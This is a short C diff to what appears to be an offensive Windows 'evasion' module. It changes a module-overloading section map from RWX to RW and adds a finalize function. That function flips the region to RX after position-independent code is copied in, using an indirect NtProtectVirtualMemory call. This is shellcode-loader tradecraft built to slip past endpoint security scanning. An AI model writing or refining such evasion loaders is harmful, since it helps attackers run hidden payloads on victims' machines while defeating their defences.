@@ -134,7 +134,7 @@ NTSTATUS evasion_module_overload(EVASION_CONTEXT *ctx, PVOID *mapped_base,
         &view_size,
         ViewShare,
         0,                              /* AllocationType */
-        PAGE_EXECUTE_READWRITE
+        PAGE_READWRITE
     );
 
     /* Close section handle regardless of map result */
@@ -148,4 +148,17 @@ NTSTATUS evasion_module_overload(EVASION_CONTEXT *ctx, PVOID *mapped_base,
     *mapped_size = view_size;
 
     return STATUS_SUCCESS;
+}
+
+/* ------------------------------------------------------------------ */
+/*  evasion_module_overload_finalize — flip RW → RX after PIC copy      */
+/* ------------------------------------------------------------------ */
+
+NTSTATUS evasion_module_overload_finalize(EVASION_CONTEXT *ctx, PVOID base, SIZE_T size) {
+    (void)ctx;
+    DWORD old_protect;
+    SIZE_T region_size = size;
+    PVOID region_base = base;
+    return spec_NtProtectVirtualMemory((HANDLE)-1, &region_base, &region_size,
+                                        PAGE_EXECUTE_READ, &old_protect);
 }
